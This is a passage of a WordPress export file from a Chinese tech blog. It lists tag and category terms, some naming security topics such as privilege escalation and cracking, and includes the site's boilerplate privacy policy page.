		<wp:term_slug><![CDATA[%e6%8c%87%e9%92%88]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[指针]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[239]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%8d%95%e6%8d%89]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[捕捉]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[240]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%8e%a5%e5%8f%a3]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[接口]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[241]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%8e%a8%e8%8d%90]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[推荐]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[242]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%8f%90%e6%9d%83]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[提权]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[243]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%8f%a1%e6%89%8b%e5%8c%85]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[握手包]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[30]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[操作系统]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[244]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%95%99%e7%a8%8b]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[教程]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[31]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%95%b0%e6%8d%ae%e5%ba%93]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[数据库]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[245]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%95%b0%e6%8d%ae%e5%ba%93]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[数据库]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[246]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[文件上传]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[247]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%96%b9%e6%b3%95]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[方法]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[248]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%99%92]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[晒]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[249]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%9b%b4%e6%96%b0]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[更新]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[1]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[uncategorized]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[未分类]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[250]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%9c%ba%e6%a2%b0%e9%94%ae%e7%9b%98]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[机械键盘]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[251]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%a0%85%e6%a0%bc%e7%b3%bb%e7%bb%9f]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[栅格系统]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[252]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%a0%87%e8%ae%b0]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[标记]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[253]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%a8%b1%e8%8a%b1]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[樱花]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[254]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%b3%9b%e5%9e%8b]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[泛型]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[255]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%b3%9b%e5%9e%8b%e6%96%b9%e6%b3%95]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[泛型方法]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[256]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%b3%9b%e5%9e%8b%e9%99%90%e5%ae%9a]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[泛型限定]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[257]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%b5%8b%e8%af%95]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[测试]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[258]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e6%b7%b1%e5%ba%a6%e5%95%86%e5%ba%97]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[深度商店]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[259]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%94%9f%e5%91%bd%e5%91%a8%e6%9c%9f]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[生命周期]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[260]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%94%a8%e6%88%b7%e7%b1%bb]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[用户类]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[261]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%9c%9f%e5%a4%8f%e3%81%ae%e9%80%9a%e3%82%8a%e9%9b%a8]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[真夏の通り雨]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[262]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%9f%a2%e9%87%8f%e5%9b%be%e6%a0%87]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[矢量图标]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[263]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%a0%b4%e8%a7%a3]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[破解]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[32]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%a1%ac%e4%bb%b6%e8%ae%be%e5%a4%87]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[硬件设备]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[264]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%a4%be%e4%bc%9a%e5%b7%a5%e7%a8%8b%e5%ad%a6]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[社会工程学]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[265]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%a9%ba%e5%80%bc]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[空值]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[266]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%a9%ba%e5%af%86%e7%a0%81]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[空密码]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[267]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%a9%ba%e6%8c%87%e9%92%88]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[空指针]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[268]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%ac%ac%e4%b8%83%e5%9b%9e]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[第七回]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[269]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%ae%a1%e7%90%86%e5%b9%b3%e5%8f%b0]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[管理平台]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[270]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%b4%a2%e5%b0%bc]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[索尼]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[271]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%bc%96%e7%a8%8b]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[编程]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[33]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[网站建设]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[272]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[网站建设]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[34]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[网络安全]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[273]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[网络安全]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[274]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e7%bd%91%e9%a1%b5%e8%ae%be%e8%ae%a1]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[网页设计]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[275]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%80%b3%e6%9c%ba]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[耳机]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[276]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%87%aa%e5%ae%9a%e4%b9%89]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[自定义]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[277]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%8c%b6%e8%bd%b4]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[茶轴]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[290]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[nav_menu]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%8f%9c%e5%8d%95]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[菜单]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[35]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%a7%86%e9%a2%91]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[视频]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[278]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%ae%be%e8%ae%a1]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[设计]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[279]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%af%ad%e6%b3%95]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[语法]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[36]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%b6%a3%e9%97%bb]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[趣闻]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[37]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%bd%af%e4%bb%b6%e5%ba%94%e7%94%a8]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[软件应用]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[280]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%bf%94%e5%9b%9e%e6%95%b0%e6%8d%ae]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[返回数据]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[281]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e8%bf%ad%e4%bb%a3%e5%99%a8]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[迭代器]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[282]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e9%80%86%e8%bd%ac%e5%8a%9b]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[逆转力]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[283]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e9%80%9a%e9%85%8d%e7%ac%a6]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[通配符]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[284]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e9%85%b7%e5%86%b7%e8%87%b3%e5%b0%8a]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[酷冷至尊]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[285]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e9%97%ae%e5%8f%b7%e9%80%9a%e9%85%8d%e7%ac%a6]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[问号通配符]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[286]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e9%98%9f%e5%88%97]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[队列]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[287]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e9%9b%86%e5%90%88]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[集合]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[288]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e9%9b%86%e5%90%88%e7%b1%bb]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[集合类]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[289]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[%e9%9d%a2%e8%af%95%e9%a2%98]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[面试题]]></wp:term_name>
	</wp:term>
			<wp:term><wp:term_id>290</wp:term_id><wp:term_taxonomy>nav_menu</wp:term_taxonomy><wp:term_slug><![CDATA[%e8%8f%9c%e5%8d%95]]></wp:term_slug><wp:term_name><![CDATA[菜单]]></wp:term_name>
</wp:term>

	<generator>https://wordpress.org/?v=5.2.2</generator>

<image>
	<url>https://www.nervgeek.com/wp-content/uploads/2019/07/cropped-eye-scan-32x32.png</url>
	<title>NervGeek</title>
	<link>https://www.nervgeek.com</link>
	<width>32</width>
	<height>32</height>
</image> 

		<item>
		<title>隐私政策</title>
		<link>https://www.nervgeek.com/?page_id=3</link>
		<pubDate>Thu, 18 Apr 2019 06:33:54 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?page_id=3</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading --><h2>我们是谁</h2><!-- /wp:heading --><!-- wp:paragraph --><p>我们的站点地址是：https://www.nervgeek.com。</p><!-- /wp:paragraph --><!-- wp:heading --><h2>我们收集何种及为何收集个人数据</h2><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>评论</h3><!-- /wp:heading --><!-- wp:paragraph --><p>当访客留下评论时，我们会收集评论表单所显示的数据，和访客的IP地址及浏览器的user agent字符串来帮助检查垃圾评论。</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>由您的电子邮件地址所生成的匿名化字符串（又称为哈希）可能会被提供给Gravatar服务确认您是否有使用该服务。Gravatar服务的隐私政策在此：https://automattic.com/privacy/。在您的评论获批准后，您的资料图片将在您的评论旁公开展示。</p><!-- /wp:paragraph --><!-- wp:heading {"level":3} --><h3>媒体</h3><!-- /wp:heading --><!-- wp:paragraph --><p>如果您向此网站上传图片，您应当避免上传那些有嵌入地理位置信息（EXIF GPS）的图片。此网站的访客将可以下载并提取此网站的图片中的位置信息。</p><!-- /wp:paragraph --><!-- wp:heading {"level":3} --><h3>联系表单</h3><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>Cookies</h3><!-- /wp:heading --><!-- wp:paragraph --><p>如果您在我们的站点上留下评论，您可以选择用cookies保存您的姓名、电子邮件地址和网站。这是通过让您可以不用在评论时再次填写相关内容而向您提供方便。这些cookies会保留一年。</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>如果您有此站点的账户并且您登录了此站点，我们会设置一个临时的cookie来确认您的浏览器是否接受cookies。此cookie不包含个人数据且会在您关闭浏览器时被丢弃。</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>当您登录时，我们也会设置多个cookies来保存您的登录信息及屏幕显示选项。登录cookies会保留两天，而屏幕显示选项cookies会保留一年。如果您选择了“记住我”，您的登录状态则会保留两周。如果您登出您的账户，用于登录的cookies将会被移除。</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>如果您编辑或发布文章，我们会在您的浏览器中保存一个额外的cookie。这个cookie不包含个人数据而只记录了您刚才编辑的文章的ID。这个cookie会保留一天。</p><!-- /wp:paragraph --><!-- wp:heading {"level":3} --><h3>其他站点的嵌入内容</h3><!-- /wp:heading --><!-- wp:paragraph --><p>此站点上的文章可能会包含嵌入的内容（如视频、图像、文章等）。来自其他站点的嵌入内容的行为和您直接访问这些其他站点没有区别。</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>这些站点可能会收集关于您的数据、使用cookies、嵌入额外的第三方跟踪程序及监视您与这些嵌入内容的交互，包括在您有这些站点的账户并登录了这些站点时，跟踪您与嵌入内容的交互。</p><!-- /wp:paragraph --><!-- wp:heading {"level":3} --><h3>统计</h3><!-- /wp:heading --><!-- wp:heading --><h2>我们与谁共享您的信息</h2><!-- /wp:heading --><!-- wp:heading --><h2>我们保留多久您的信息</h2><!-- /wp:heading --><!-- wp:paragraph --><p>如果您留下评论，评论和其元数据将被无限期保存。我们这样做以便能识别并自动批准任何后续评论，而不用将这些后续评论加入待审队列。</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>对于本网站的注册用户，我们也会保存用户在个人资料中提供的个人信息。所有用户可以在任何时候查看、编辑或删除他们的个人信息（除了不能变更用户名外）、站点管理员也可以查看及编辑那些信息。</p><!-- /wp:paragraph --><!-- wp:heading --><h2>您对您的信息有什么权利</h2><!-- /wp:heading --><!-- wp:paragraph --><p>如果您有此站点的账户，或曾经留下评论，您可以请求我们提供我们所拥有的您的个人数据的导出文件，这也包括了所有您提供给我们的数据。您也可以要求我们抹除所有关于您的个人数据。这不包括我们因管理、法规或安全需要而必须保留的数据。</p><!-- /wp:paragraph --><!-- wp:heading --><h2>我们将您的信息发送到哪</h2><!-- /wp:heading --><!-- wp:paragraph --><p>访客评论可能会被自动垃圾评论监测服务检查。</p><!-- /wp:paragraph --><!-- wp:heading --><h2>您的联系信息</h2><!-- /wp:heading --><!-- wp:heading --><h2>其他信息</h2><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>我们如何保护您的数据</h3><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>我们有何种数据泄露处理流程</h3><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>我们从哪些第三方接收数据</h3><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>我们通过用户数据进行何种自动决策及/或归纳</h3><!-- /wp:heading --><!-- wp:heading {"level":3} --><h3>行业监管披露要求</h3><!-- /wp:heading -->]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>3</wp:post_id>
		<wp:post_date><![CDATA[2019-04-18 14:33:54]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-04-18 06:33:54]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[closed]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[privacy-policy]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[page]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
														<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_page_template]]></wp:meta_key>
		<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>关于我</title>
		<link>https://www.nervgeek.com/%e5%85%b3%e4%ba%8e%e6%88%91/</link>
		<pubDate>Sun, 11 Oct 2015 23:10:55 +0000</pubDate>
